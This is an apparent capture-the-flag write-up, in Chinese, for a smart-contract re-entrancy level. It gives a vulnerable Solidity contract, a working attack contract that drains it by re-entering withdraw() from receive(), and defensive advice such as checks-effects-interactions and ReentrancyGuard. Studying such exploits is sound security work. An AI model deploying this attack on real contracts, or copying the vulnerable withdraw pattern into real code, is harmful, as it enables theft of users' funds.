# Re-entrancy

> 这一关的目标是偷走合约的所有资产.

## 源码

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract Reentrance {
  
  using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
}
```

## 攻击思路

和上一关异曲同工。合约中的提取withdraw函数可以进行重入攻击。函数逻辑中先进行转账后调整余额。合约收到余额后触发receive函数后可以再进行withdraw。此为重入攻击

## 攻击代码

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Reentrance{
    function donate(address _to) external payable;
    function withdraw(uint _amount) external;
}

// 实际攻击时应该再写一个只有合约owner才能调用的提取方法，把攻击得来的币提取出来，不过，太懒了算了。
contract Attack {
    address target = 0x0749abb39521c2Cc3a8942fa1d4fA450ee136995;

    function attack() public payable{
        (bool success,) = target.call{value:1000000000000000}(abi.encodeWithSelector(Reentrance.donate.selector, address(this)));
        require(success);
        (bool ok,) = target.call(abi.encodeWithSelector(Reentrance.withdraw.selector, 1000000000000000));
        require(ok);
    }

    receive() external payable{
        (bool ok,) = target.call(abi.encodeWithSelector(Reentrance.withdraw.selector, 1000000000000000));
        require(ok);
    }

}
```

为了防止转移资产时的重入攻击, 使用 [Checks-Effects-Interactions pattern](https://solidity.readthedocs.io/en/develop/security-considerations.html#use-the-checks-effects-interactions-pattern) 注意 `call` 只会返回 false 而不中断执行流. 其它方案比如 [ReentrancyGuard](https://docs.openzeppelin.com/contracts/2.x/api/utils#ReentrancyGuard) 或 [PullPayment](https://docs.openzeppelin.com/contracts/2.x/api/payment#PullPayment) 也可以使用.

`transfer` 和 `send` 不再被推荐使用, 因为他们在 Istanbul 硬分叉之后可能破坏合约 [Source 1](https://diligence.consensys.net/blog/2019/09/stop-using-soliditys-transfer-now/) [Source 2](https://forum.openzeppelin.com/t/reentrancy-after-istanbul/1742).

总是假设资产的接受方可能是另一个合约, 而不是一个普通的地址. 因此, 他有可能执行了他的payable fallback 之后又“重新进入” 你的合约, 这可能会打乱你的状态或是逻辑.

重进入是一种常见的攻击. 你得随时准备好!

#### The DAO Hack

著名的DAO hack 使用了重进入攻击, 窃取了受害者大量的 ether. 参见 [15 lines of code that could have prevented TheDAO Hack](https://blog.openzeppelin.com/15-lines-of-code-that-could-have-prevented-thedao-hack-782499e00942).